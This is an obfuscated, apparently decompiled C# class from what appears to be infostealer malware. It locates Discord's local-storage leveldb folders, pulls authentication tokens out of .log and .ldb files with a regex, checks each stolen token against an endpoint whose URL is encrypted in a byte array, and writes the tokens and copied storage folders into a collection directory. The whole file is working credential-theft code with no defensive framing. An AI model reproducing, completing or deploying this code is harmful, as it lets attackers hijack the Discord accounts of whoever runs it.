using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using ns13;
using ns14;
using ns2;

namespace ns6;

internal sealed class Class25
{
	private static Regex regex_0 = new Regex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}");

	private static string[] string_0 = new string[3] { "Discord\\Local Storage\\leveldb", "Discord PTB\\Local Storage\\leveldb", "Discord Canary\\leveldb" };

	public static void smethod_0(string[] string_1, string string_2)
	{
		if (string_1.Length != 0)
		{
			Directory.CreateDirectory(string_2);
			Class55.bool_3 = true;
			try
			{
				foreach (string text in string_1)
				{
					File.AppendAllText(string_2 + "\\tokens.txt", text + "\n");
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}
		try
		{
			smethod_1(string_2);
		}
		catch
		{
		}
	}

	private static void smethod_1(string string_1)
	{
		string[] array = string_0;
		foreach (string path in array)
		{
			string path2 = Path.Combine(Class56.string_3, path);
			string string_2 = Path.Combine(string_1, new DirectoryInfo(path2).Name);
			if (Directory.Exists(path2))
			{
				try
				{
					Class62.smethod_1(path2, string_2);
				}
				catch
				{
				}
			}
		}
	}

	private static string smethod_2(string string_1)
	{
		try
		{
			using WebClient webClient = new WebClient();
			webClient.Headers.Add("Authorization", string_1);
			return webClient.DownloadString(Class10.smethod_1(new byte[48]
			{
				204, 119, 158, 154, 23, 66, 149, 141, 183, 108,
				94, 12, 88, 31, 176, 188, 18, 22, 179, 36,
				224, 199, 140, 191, 17, 128, 191, 221, 16, 110,
				63, 145, 150, 152, 246, 105, 199, 84, 221, 181,
				90, 40, 214, 128, 166, 54, 252, 46
			})).Contains("Unauthorized") ? "Token is invalid" : "Token is valid";
		}
		catch
		{
		}
		return "Connection error";
	}

	public static string[] smethod_3()
	{
		List<string> list = new List<string>();
		try
		{
			string[] array = string_0;
			foreach (string path in array)
			{
				string path2 = Path.Combine(Class56.string_3, path);
				string text = Path.Combine(Path.GetTempPath(), new DirectoryInfo(path2).Name);
				if (!Directory.Exists(path2))
				{
					continue;
				}
				Class62.smethod_1(path2, text);
				string[] files = Directory.GetFiles(text);
				foreach (string text2 in files)
				{
					if (text2.EndsWith(".log") || text2.EndsWith(".ldb"))
					{
						string input = File.ReadAllText(text2);
						Match match = regex_0.Match(input);
						if (match.Success)
						{
							list.Add(match.Value + " - " + smethod_2(match.Value));
						}
					}
				}
				Class62.smethod_0(text);
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
		return list.ToArray();
	}
}
